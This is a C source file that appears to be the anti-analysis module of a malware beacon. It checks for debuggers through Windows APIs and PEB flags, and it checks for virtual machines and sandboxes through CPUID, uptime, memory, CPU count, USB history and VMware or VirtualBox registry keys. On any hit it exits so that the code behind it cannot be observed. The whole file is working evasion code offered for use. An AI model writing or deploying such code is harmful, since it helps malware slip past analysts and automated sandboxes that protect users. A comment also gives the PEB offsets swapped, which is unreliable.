
#include <windows.h>
#include <intrin.h>
#include <stdio.h>


// Returns TRUE if a debugger is detected
BOOL anti_debug_check() {
    //  IsDebuggerPresent (PEB->BeingDebugged)
    if (IsDebuggerPresent()) {
        printf("[!] anti_debug: IsDebuggerPresent() = TRUE\n");
        return TRUE;
    }

    //  CheckRemoteDebuggerPresent (NtQueryInformationProcess)
    BOOL remoteDebugger = FALSE;
    CheckRemoteDebuggerPresent(GetCurrentProcess(), &remoteDebugger);
    if (remoteDebugger) {
        printf("[!] anti_debug: Remote debugger detected\n");
        return TRUE;
    }

    //  NtGlobalFlag check (PEB offset 0x68 on x64, 0xBC on x86)
    // If set to 0x70 (FLG_HEAP_ENABLE_TAIL_CHECK | FREE_CHECK | VALIDATE_PARAMS)
    // then a debugger created this process
#ifdef _WIN64
    PPEB pPeb = (PPEB)__readgsqword(0x60);
    DWORD ntGlobalFlag = *(DWORD*)((PBYTE)pPeb + 0xBC);
#else
    PPEB pPeb = (PPEB)__readfsdword(0x30);
    DWORD ntGlobalFlag = *(DWORD*)((PBYTE)pPeb + 0x68);
#endif
    if (ntGlobalFlag == 0x70) {
        printf("[!] anti_debug: NtGlobalFlag = 0x%X (debugger heap flags)\n",
               ntGlobalFlag);
        return TRUE;
    }

   

    return FALSE;
}


// Returns TRUE if running inside a VM or sandbox
BOOL anti_vm_check() {
    // 1. CPUID hypervisor bit (ECX bit 31 of leaf 1)
    int cpuInfo[4] = {0};
    __cpuid(cpuInfo, 1);
    if (cpuInfo[2] & (1 << 31)) {
        printf("[!] anti_vm: CPUID hypervisor bit set\n");
        return TRUE;
    }

    // 2. Low uptime — sandboxes often boot fresh
    if (GetTickCount64() < 300000ULL) { // < 5 minutes
        printf("[!] anti_vm: Uptime < 5 min (sandbox?)\n");
        return TRUE;
    }

    // 3. Low physical memory — VMs often have < 2 GB
    MEMORYSTATUSEX mem = {0};
    mem.dwLength = sizeof(mem);
    GlobalMemoryStatusEx(&mem);
    if (mem.ullTotalPhys < (2ULL * 1024 * 1024 * 1024)) {
        printf("[!] anti_vm: Physical memory < 2 GB (VM?)\n");
        return TRUE;
    }
    // checking the CPU for possible VItrual enviornment
    SYSTEM_INFO SysInfo = {0};
    GetSystemInfo(&SysInfo);
    if (SysInfo.dwNumberOfProcessors < 2) {
      printf("[!] anti_debug: Vritualization in sandbox detected\n");
      return TRUE;
    }
    // Checking previously mounted USB devices
    HKEY hKey = NULL;
    DWORD dwUsbNumber = 0;
    DWORD dwRegErr = 0;
    if ((dwRegErr = RegOpenKeyExA(HKEY_LOCAL_MACHINE,
                                  "SYSTEM\\ControlSet001\\Enum\\USBSTOR", NULL,
                                  KEY_READ, &hKey)) != ERROR_SUCCESS) {
      printf("\n\t[!] RegOpenKeyExA Failed With Error : %d | 0x%0.8X \n",
             dwRegErr, dwRegErr);
             goto skip_usb;
    }

    if ((dwRegErr = RegQueryInfoKeyA(hKey, NULL, NULL, NULL, &dwUsbNumber, NULL,
                                     NULL, NULL, NULL, NULL, NULL, NULL)) !=
        ERROR_SUCCESS) {
      printf("\n\t[!] RegQueryInfoKeyA Failed With Error : %d | 0x%0.8X \n",
             dwRegErr, dwRegErr);
             RegCloseKey(hKey);
             goto skip_usb;
    }
RegCloseKey(hKey);
hKey = NULL;
    // Less than 2 USBs previously mounted
    if (dwUsbNumber < 2) {
      // possibly a virtualized environment
      printf("[!] anti_debug: Vritualization in sandbox detected\n");
      return TRUE;
    }

    skip_usb:
    //  Check for VM-related registry keys
    
    if (RegOpenKeyExA(HKEY_LOCAL_MACHINE,
                      "SOFTWARE\\VMware, Inc.\\VMware Tools", 0, KEY_READ,
                      &hKey) == ERROR_SUCCESS) {
     
     
                        RegCloseKey(hKey);
      printf("[!] anti_vm: VMware Tools registry key found\n");
      return TRUE;
    }
    if (RegOpenKeyExA(HKEY_LOCAL_MACHINE,
                      "SOFTWARE\\Oracle\\VirtualBox Guest Additions", 0,
                      KEY_READ, &hKey) == ERROR_SUCCESS) {
      RegCloseKey(hKey);
      printf("[!] anti_vm: VirtualBox registry key found\n");
      return TRUE;
    }

    return FALSE;
}

// -- Combined check (called from beacon_run or evasion logic) ---------
BOOL anti_analysis_run() {
    if (anti_debug_check()) {
        printf("[!] Debugger detected — exiting\n");
        ExitProcess(0);
    }
    if (anti_vm_check()) {
        printf("[!] VM/sandbox detected — exiting\n");
        ExitProcess(0);
    }
    printf("[+] Anti-analysis checks passed\n");
    return TRUE;
}
